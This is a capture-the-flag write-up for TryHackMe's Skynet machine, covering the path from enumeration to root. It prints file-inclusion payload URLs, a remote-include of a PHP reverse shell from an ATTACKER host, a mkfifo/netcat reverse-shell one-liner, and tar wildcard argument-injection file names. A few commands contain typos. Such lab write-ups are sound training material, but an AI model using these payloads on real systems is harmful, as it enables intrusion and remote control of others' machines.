---
title: "Skynet"
date: 2025-11-24
draft: false
summary: "Writeup for Skynet CTF challenge on TryHackMe."
tags: ["linux", "rce", "lfi"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/skynet/cover.webp"
  caption: "Skynet TryHackMe Challenge"
  alt: "Skynet cover"
platform: "TryHackMe"
---

A vulnerable Terminator themed Linux machine.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/skynet

## Reconnaissance

I performed an **nmap** scan on the target to find open ports and services running on it.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN skynet.nmap
```

![](https://cdn.ziomsec.com/skynet/1.webp)

## Foothold

I visited the web application running on the target through my browser.

![](https://cdn.ziomsec.com/skynet/2.webp)

I then fuzzed for interesting directories using **ffuf** and found a directory called *squirrelmail*

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 403
```

![](https://cdn.ziomsec.com/skynet/3.webp)

Visiting the endpoint revealed a login panel.

![](https://cdn.ziomsec.com/skynet/4.webp)

I did a google search regarding the version of *squirrelmail* and found some articles that hinted towards a remote code execution vulnerability.

I then enumerated smb running on the target using **enum4linux** and found a username and interesting shares.

```shell
enum4linux -a TARGET
```

![](https://cdn.ziomsec.com/skynet/5.webp)

The *anonymous* share seemed interesting, so I connected to it and found some text files.

```shell
smbmap -H TARGET
smbclient \\\\TARGET\\anonymous
```

![](https://cdn.ziomsec.com/skynet/6.webp)

I downloaded these files onto my local system.

![](https://cdn.ziomsec.com/skynet/7.webp)

The *attention.txt* file confirmed the existence of a user called *milesdyson*. *log1.txt* contained a wordlist.

![](https://cdn.ziomsec.com/skynet/8.webp)

I tried brute forcing the password of *milesdyson* but failed.

```shell
hydra -l 'milesdyson' -P log1.txt smb://TARGET
```

Since the wordlist only contained 31 words, I used them to try logging into *squirrelmail* as *milesdyson* and was successfully able to log in using the first password. 

![](https://cdn.ziomsec.com/skynet/9.webp)

The email from *skynet* regarding SAMBA password reset seemed interesting so I opened it and found my SAMBA password.

![](https://cdn.ziomsec.com/skynet/10.webp)

I then accessed my share using these credentials and found a *notes* directory.

```shell
smbclient \\\\TARGET\\milesdyson -U "milesdyson"
```

![](https://cdn.ziomsec.com/skynet/11.webp)

The *notes* directory contained a file called *important.txt* so I downloaded it.

![](https://cdn.ziomsec.com/skynet/12.webp)

The text file revealed a new endpoint.

![](https://cdn.ziomsec.com/skynet/13.webp)

I accessed the endpoint but did not find anything useful at first.

![](https://cdn.ziomsec.com/skynet/14.webp)

I then fuzzed for directories and found the *administrator* endpoint.

```shell
ffuf -u http://TARGET/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 403
```

![](https://cdn.ziomsec.com/skynet/15.webp)

I accessed it and found a *Cuppa* CMS login panel.

![](https://cdn.ziomsec.com/skynet/16.webp)

I searched for exploits related to it and found that it was vulnerable to file inclusion.

```shell
searchsloit 'cuppa cms'
searchsploit -m php/webapps/25971.txt
```

![](https://cdn.ziomsec.com/skynet/17.webp)

I read the file and looked for the endpoint that was vulnerable.

![](https://cdn.ziomsec.com/skynet/18.webp)

![](https://cdn.ziomsec.com/skynet/19.webp)

After verifying that the endpoint existed, I tried the exploit and was successfully able to read the `/etc/passwd` file.

```
http://TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../etc/passwd
```

![](https://cdn.ziomsec.com/skynet/20.webp)

I also tried reading the configuration file and found the credentials for the database.

```
http://TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/covert.base64-encode/resource=../Configuration.php
```

![](https://cdn.ziomsec.com/skynet/21.webp)

![](https://cdn.ziomsec.com/skynet/22.webp)

I then created a **php** reverse shell and hosted it on an **http** server locally. I exploited the file inclusion vulnerability to include the **php** payload to get a reverse shell on my **netcat** listener.

```
curl http://TARGET/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER/revshell.php
```

![](https://cdn.ziomsec.com/skynet/23.webp)

I then captured the user flag from *mikedyson*'s home directory.

```shell
cat /home/milesdyson/user.txt
```

![](https://cdn.ziomsec.com/skynet/24.webp)

## Privilege Escalation

I examined my home directory and found an interesting directory called *backups*. Inside the directory, there was a **tar** archive and a bash script.

![](https://cdn.ziomsec.com/skynet/25.webp)

I viewed the script and found it was used to create a backup of contents inside `/var/www/html` and save it as an archive inside the *backup.tgz* file.

![](https://cdn.ziomsec.com/skynet/26.webp)

I could use the **wildcard** to escalate my privilege if it could be executed as root. I checked the `/etc/crontab` file and found that the *root* user executed the **bash** script to create the backup.

```shell
cat /etc/crontab
```

![](https://cdn.ziomsec.com/skynet/27.webp)

I referred the the following article to escalate my privilege by exploiting wildcard:
- https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

I copied a **netcat** mkfifo reverse shell payload from **revhsells**.
- https://www.revshells.com

Finally, I followed the methods from the article and used the payload to get a reverse shell as *root* user on another **netcat** listener.

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER 8000 >/tmp/f" > /var/www/html/shell.sh

echo "" > "--checkpoint-action=exec=sh /var/www/html/shell.sh"

echo "" > --checkpoint=1
```

![](https://cdn.ziomsec.com/skynet/28.webp)

After gaining root access, I captured the final flag from `/root` directory.

```shell
cat /root/root.txt
```

![](https://cdn.ziomsec.com/skynet/29.webp)

That's it from my side! Until next time :)

---